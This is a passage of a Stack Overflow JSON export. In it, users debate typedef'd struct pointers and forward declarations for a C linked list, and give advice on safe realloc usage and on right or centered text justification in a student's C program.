"display_name": "mightyWOZ", "link": "https://stackoverflow.com/users/4413098/mightywoz"}, "edited": false, "score": 0, "creation_date": 1444844258, "post_id": 33131983, "comment_id": 54075540, "body": "first one is working fine. what error did you find in that ?"}, {"owner": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444844616, "post_id": 33131983, "comment_id": 54075747, "body": "@wildplasser That&#39;s incorrect. Typedef&#39;s are an integral part of the C language and important for even a novice to understand."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "reply_to_user": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "edited": false, "score": 0, "creation_date": 1444844864, "post_id": 33131983, "comment_id": 54075872, "body": "@ConnorHollis They are <i>very confusing</i> to novice users, and in most cases not needed. And they can be taught later, after the basics have been covered."}, {"owner": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444845260, "post_id": 33131983, "comment_id": 54076110, "body": "@wildplasser Is a struct not considered basic? It&#39;s a foundation of the C language. I would argue that it&#39;s a feature that needs to be covered early on and not later."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1444845325, "post_id": 33131983, "comment_id": 54076157, "body": "A struct is basic, but you do not <i>need</i> the typedef."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1444845424, "post_id": 33131983, "comment_id": 54076212, "body": "Please tell your teach that <code>typedef</code>ing a pointer is very confusing, as it hide the pointer sematics. It should not be done for normal usage and shall not for beginner&#39;s code. In general, it is better just to <code>typedef</code> the <code>struct</code> and require explicit pointer syntax to use a pointer."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444845482, "post_id": 33131983, "comment_id": 54076247, "body": "@wildplasser: The problem is <code>typedef</code>ing a pointer, not the <code>typedef</code> as such. It would be fine to <code>typedef</code> the latter."}, {"owner": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444845485, "post_id": 33131983, "comment_id": 54076249, "body": "@wildplasser I don&#39;t think it wise to teach someone a method and then change the information on them later. If you are teaching structures then it makes sense for someone to learn both the keyword struct variable declaration and the struct typedef method."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "edited": false, "score": 0, "creation_date": 1444845535, "post_id": 33131983, "comment_id": 54076283, "body": "@ConnorHollis <code>typedef</code> has nothing to do with <code>struct</code>, it&#39;s just often used to hide the fact your type is a <code>struct</code>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "edited": false, "score": 0, "creation_date": 1444845590, "post_id": 33131983, "comment_id": 54076325, "body": "@ConnorHollis: <code>typedef</code> has nothing to do with <code>struct</code>. However, it is generally a good idea to introduce <code>typedef</code> before <code>struct</code>s, etc. and when it comes to <code>struct</code>s use it naturally."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1444845595, "post_id": 33131983, "comment_id": 54076328, "body": "@Olaf: that is correct, but typedeffing the node <i>and</i> the pointer will end up in having three ways to represent the same thing, when only one is needed. Is only adds a lot of visual(and mental) fluff."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444845653, "post_id": 33131983, "comment_id": 54076366, "body": "@wildplasser: Please read my comment again. I&#39;m <b>strictly</b> against <code>typedef</code>ing a pointer. But a <code>struct</code> should be <code>typedef</code>ed along with its definition and the <code>struct mystruct</code> syntax should only be used where required (i.e. as forward reference)."}, {"owner": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "edited": false, "score": 0, "creation_date": 1444845713, "post_id": 33131983, "comment_id": 54076407, "body": "I don&#39;t mean to imply that a typedef is only useful for a struct. But I believe typedef is a powerful tool that people argue is &quot;too challenging.&quot; In my opinion it is a basic feature of the language that shoud be taught early. I don&#39;t agree that typedef&#39;ing a pointer is always right but it can be useful."}, {"owner": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "edited": false, "score": 0, "creation_date": 1444845776, "post_id": 33131983, "comment_id": 54076442, "body": "Also this is a hell of a comment thread on this question. I don&#39;t have anything else to say about this but if others do maybe the conversation should move to some kind of chat?"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1444845846, "post_id": 33131983, "comment_id": 54076480, "body": "@olaf: I read it. I am <b>even</b> against using a typedef for the node, since it is not needed. (its only purpose is to avoid typeing the <code>struct</code> keyword) BTW: I think we agree. It can come in handy for introducing <i>opaque</i> types."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "edited": false, "score": 0, "creation_date": 1444845908, "post_id": 33131983, "comment_id": 54076516, "body": "@ConnorHollis: &quot;... but it can be useful.&quot; Only for opaque handles and they it should be better made a <code>uintptr_t</code> or at least <code>void *</code>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444846043, "post_id": 33131983, "comment_id": 54076594, "body": "@wildplasser: About the pointer we might agree, but not about <code>typedef</code>ing a <code>struct</code>. My standard policy is to always <code>typedef</code> them along with the declaration (I&#39;m against seperating <code>typedef</code> and declaration, however. That &#180;struct` tag syntax is a C-special anyway; most other languages don&#39;t even support such (although it comes handy for recursive pointers, of course)."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "edited": false, "score": 0, "creation_date": 1444846048, "post_id": 33131983, "comment_id": 54076598, "body": "@ConnorHollis in your typical coding guidelines, you will find qualifiers like &quot;consider&quot;, &quot;avoid&quot; and &quot;always&quot;/&quot;never&quot;. Typedef&#39;ing a pointer IMHO belongs into the &quot;avoid&quot; category. You <i>can</i> do it, but if you choose to, have a good reason and document it. The teacher&#39;s code <i>here</i> would definitely fail my code review ...."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1444846474, "post_id": 33131983, "comment_id": 54076863, "body": "@Olaf: there could be a place for that, sometimes, somewhere. But it certainly is confusing for novice users. (WRT pointer-typedeffing: take a look at libxml2; it can even confuse experienced users ;-)"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444846999, "post_id": 33131983, "comment_id": 54077178, "body": "@wildplasser I agree with Olaf, and also a <i>bit</i> with you. When thinking &quot;in objects&quot;, the separate struct namespace of C is a legacy that doesn&#39;t have any expressive value. On the other hand, when you use a <code>struct</code> very traditionally as an &quot;all public&quot; data container, it could make sense to explicitly refer to it as a <code>struct</code> on any usage."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444848430, "post_id": 33131983, "comment_id": 54078013, "body": "@FelixPalmen Even when entering the definition into the &quot;typedef namespace&quot;, the &quot;struct namespace&quot; still exists, as a parallel universe."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444848586, "post_id": 33131983, "comment_id": 54078107, "body": "@wildplasser there&#39;s no &quot;typedef namespace&quot; as it uses the global namespace like builtin types ... and concerning the &quot;struct namespace&quot; -- yes, it&#39;s always there, but that doesn&#39;t mean you <i>have</i> to use it. Code for clarity, make intentions clear, and make underlying technical concepts explicit <i>exactly</i> where this information is valuable to the consumer."}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 1, "last_activity_date": 1444844531, "creation_date": 1444844531, "answer_id": 33132107, "question_id": 33131983, "link": "https://stackoverflow.com/questions/33131983/structure-pointer-forward-declaration/33132107#33132107", "title": "Structure pointer forward declaration?", "body": "<p>What you're doing in the second case is not a forward declaration.  It's attempting to use a type (<code>node</code>) without defining it.</p>\n\n<p>The first case doesn't quite work either.  It gives the following warning:</p>\n\n<blockquote>\n  <p>warning: useless storage class specifier in empty declaration</p>\n</blockquote>\n\n<p>That is because you're not assigning a type alias for <code>struct node</code>.  You'd have to do it like this:</p>\n\n<pre><code>typedef struct node{\n    int value;\n    ptr next;\n} node;\n</code></pre>\n\n<p>Now, you can use <code>node</code> in place of <code>struct node</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "edited": false, "score": 0, "creation_date": 1444845019, "post_id": 33132119, "comment_id": 54075979, "body": "I don&#39;t agree that typedef&#39;ing a pointer type for a struct is a bad practice. I think a well named pointer typedef can be clarifying and useful in certain instances. Great answer though."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "edited": false, "score": 1, "creation_date": 1444845172, "post_id": 33132119, "comment_id": 54076053, "body": "@ConnorHollis there are differing opinions on that matter, still you find it banned a lot. Rationale is everyone knows that the asterisk in a declaration modifies the type to be a pointer. At best, you would replace that by some pre- or postfix &quot;ptr&quot;, &quot;p_&quot; or whatever. It doesn&#39;t help clarity but instead makes you look twice when understanding other people&#39;s code."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 1045, "user_id": 1710303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb8cdc71ff716acf0daf2bc1d0e0d256?s=128&d=identicon&r=PG", "display_name": "Connor Hollis", "link": "https://stackoverflow.com/users/1710303/connor-hollis"}, "edited": false, "score": 0, "creation_date": 1444845307, "post_id": 33132119, "comment_id": 54076142, "body": "@ConnorHollis the only valid reason to do it anyways I can think of right now is some kind of &quot;opaque handle&quot; where calling code should know <i>nothing</i> about it and just pass it to the respective API as-is. -- surely doesn&#39;t really apply in this typical &quot;linked list&quot; scenario."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444845420, "post_id": 33132119, "comment_id": 54076209, "body": "In fact, you do not even need the incomplete type. The resulting code will become shorter, too."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444845480, "post_id": 33132119, "comment_id": 54076246, "body": "@wildplasser sure you do, as soon as you need the <code>next</code> member"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444845721, "post_id": 33132119, "comment_id": 54076411, "body": "@wildplasser just realized you&#39;re talking about the &quot;typedef-free&quot; version. Then, yes, indeed. I&#39;ll leave the forward declaration there anyways as it helps to see what the actual forward declaration is (as opposed to the typedef)"}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": true, "score": 4, "last_activity_date": 1444846242, "last_edit_date": 1444846242, "creation_date": 1444844580, "answer_id": 33132119, "question_id": 33131983, "link": "https://stackoverflow.com/questions/33131983/structure-pointer-forward-declaration/33132119#33132119", "title": "Structure pointer forward declaration?", "body": "<pre><code>typedef struct node *ptr;\nptr start,current;\ntypedef struct node{\n    int value;\n    ptr next;\n};\n</code></pre>\n\n<p>The typedef for the struct itself won't work this way, I guess you're missing a <code>node</code> at the end (It's missing the identifier of the newly defined type).</p>\n\n<p>At this point, I'd tell your teacher to please <strong>not</strong> confuse everyone by <code>typedef</code>ing a pointer type. It's widely common to have the pointer type modifier visible on every usage, just to make it obvious it <em>is</em> a pointer. But now to the actual answer:</p>\n\n<pre><code>node *start;\nnode *current;\ntypedef struct node{\n    int value;\n    node *next;\n};\n</code></pre>\n\n<p>Start at the first line: you use <code>node</code> here as a type identifier. But you didn't tell the compiler yet what kind of type <code>node</code> should be. In fact, what you're actually missing <em>is</em> a forward declaration. It would work like the following:</p>\n\n<pre><code>/* forward-declare \"struct node\" and at the same time define the type\n * \"node\" to be a \"struct node\":\n */\ntypedef struct node node;\n\n/* now use your type by declaring variables of that type: */\nnode *start;\nnode *current;\n\n/* finally fully declare your \"struct node\": */\nstruct node {\n    int value;\n    node *next;\n};\n</code></pre>\n\n<p>Or, without the <code>typedef</code>, that easily confuses a beginner:</p>\n\n<pre><code>struct node; /* forward declaration (not strictly necessary in this little example) */\n\nstruct node *start;\nstruct node *current;\n\nstruct node {\n    int value;\n    struct node *next;\n};\n</code></pre>\n"}], "owner": {"reputation": 2952, "user_id": 4413098, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5a944fcc2691378e0c49b5c564bd55d2?s=128&d=identicon&r=PG&f=1", "display_name": "mightyWOZ", "link": "https://stackoverflow.com/users/4413098/mightywoz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2783, "favorite_count": 0, "accepted_answer_id": 33132119, "answer_count": 2, "score": -1, "last_activity_date": 1444846242, "creation_date": 1444844072, "question_id": 33131983, "link": "https://stackoverflow.com/questions/33131983/structure-pointer-forward-declaration", "title": "Structure pointer forward declaration?", "body": "<p>I am new to c programming and creating linked list data structure, MY teacher gave me some code which seems a bit confusing :</p>\n\n<pre><code>typedef struct node *ptr;\nptr start,current;\ntypedef struct node{\n    int value;\n    ptr next;\n};\n</code></pre>\n\n<p>This code works fine and using the other functions i can create a linked list , my confusion is that, when i change the code like this: </p>\n\n<pre><code>node *start;\nnode *current;\ntypedef struct node{\n    int value;\n    node *next;\n};\n</code></pre>\n\n<p>it doesn't work .What is wrong with this code why cant i forward declare the  node pointers anymore.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1444844176, "post_id": 33131934, "comment_id": 54075494, "body": "Unrelated to the problem you&#39;re asking about, but you might want to read <a href=\"http://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\">Why is \u201cwhile ( !feof (file) )\u201d always wrong</a>."}, {"owner": {"reputation": 11, "user_id": 5446240, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153630496039144/picture?type=large", "display_name": "Adam Alred", "link": "https://stackoverflow.com/users/5446240/adam-alred"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1444844238, "post_id": 33131934, "comment_id": 54075533, "body": "I know, I&#39;ve been told this a bunch already but this is how we are taught so I am going to use it this way for simplicity&#39;s sake."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1444844578, "post_id": 33131934, "comment_id": 54075727, "body": "<code>realloc(str, size * 2);</code> --&gt; <code>{ str =  realloc(str, sizeof *str * size * 2); size *=2; }</code> (plus error handling, of course ...)"}, {"owner": {"reputation": 11, "user_id": 5446240, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153630496039144/picture?type=large", "display_name": "Adam Alred", "link": "https://stackoverflow.com/users/5446240/adam-alred"}, "edited": false, "score": 0, "creation_date": 1444844967, "post_id": 33131934, "comment_id": 54075941, "body": "Can you explain why?"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444845006, "post_id": 33131934, "comment_id": 54075965, "body": "Also: <code>if(i+1 == size) {</code> --&gt;&gt; <code>if(i == size) {</code> @AdamAlred: yes, just look at your initial malloc, which <i>does</i> scale by <code>sizeof (char*)</code>"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1444845642, "post_id": 33131934, "comment_id": 54076361, "body": "@AdamAlred <code>realloc</code> frees <code>str</code> and returns a pointer to the newly allocated block of memory on success. If you are not assigning the return of <code>realloc</code>, you are just blowing away everything in <code>str</code>... You should really <code>realloc</code> with a temp variable (e.g. <code>char *tmp = realloc (str, sizeof *str * size * 2); if (tmp) str = tmp;</code>) This protects against losing all data in <code>str</code> in the event <code>realloc</code> fails (it returns <code>NULL</code>)"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1444846378, "post_id": 33131934, "comment_id": 54076811, "body": "@AdamAlred, If your think about it, there is only 1 piece of information you need to worry about to write your output routine. That is the number of spaces to print before your line. This applies to center and right justified text. In the case of centered text, it is 1/2 what it would be for right justified. So you know the width it should fit in (say <code>w</code>), you know the length of each line from <code>strlen</code> (say <code>l</code>), then the number of spaces to print before the right justified text will be <code>w - l</code>, and in the case of centered <code>(w - l)&#47;2</code>. Give it a go."}, {"owner": {"reputation": 11, "user_id": 5446240, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153630496039144/picture?type=large", "display_name": "Adam Alred", "link": "https://stackoverflow.com/users/5446240/adam-alred"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1444846565, "post_id": 33131934, "comment_id": 54076932, "body": "@DavidC.Rankin I just edited what I think might help fix it. I am able to print the first three words in the left justification, can you tell me if this is on the right track?"}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 5446240, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153630496039144/picture?type=large", "display_name": "Adam Alred", "link": "https://stackoverflow.com/users/5446240/adam-alred"}, "edited": false, "score": 0, "creation_date": 1444853289, "post_id": 33134379, "comment_id": 54080858, "body": "Why are you checking the length of the line? The 15 given in the example is how many spots you can have per one line, or is that what you are doing?"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 11, "user_id": 5446240, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153630496039144/picture?type=large", "display_name": "Adam Alred", "link": "https://stackoverflow.com/users/5446240/adam-alred"}, "edited": false, "score": 0, "creation_date": 1444853690, "post_id": 33134379, "comment_id": 54081065, "body": "Well, you have to check the length of the line to figure out how many spaces you need to print before the text for <code>c</code> centered or <code>r</code> right justified text. So since you will need to compute and use the length more than once, for efficiency sake, why not simply calculate the length once and store it in an array <code>len</code> for later use."}, {"owner": {"reputation": 11, "user_id": 5446240, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153630496039144/picture?type=large", "display_name": "Adam Alred", "link": "https://stackoverflow.com/users/5446240/adam-alred"}, "edited": false, "score": 0, "creation_date": 1444854166, "post_id": 33134379, "comment_id": 54081354, "body": "Okay, I think that is making sense. Sorry, I&#39;m freaking out so much about this project that I&#39;m not really thinking straight:/ I appreciate the help though"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 11, "user_id": 5446240, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153630496039144/picture?type=large", "display_name": "Adam Alred", "link": "https://stackoverflow.com/users/5446240/adam-alred"}, "edited": false, "score": 0, "creation_date": 1444855827, "post_id": 33134379, "comment_id": 54082261, "body": "No problem. I find that if I&#39;m stuck on part of a problem, I&#39;ll go do something else for a little while and let my mind continue thinking about the different ways to approach the problem. 99% of the time, your mind just naturally sifts through the possibilities and hits on the solution -- as long as you give it time to think. If you sit there and continue to bang your head into the monitor without a break, you generally end up with nothing more than a sore forehead. 10 minutes or so is usually long enough. If you get totally wrapped around the axle, I have the rest I can post."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 11, "user_id": 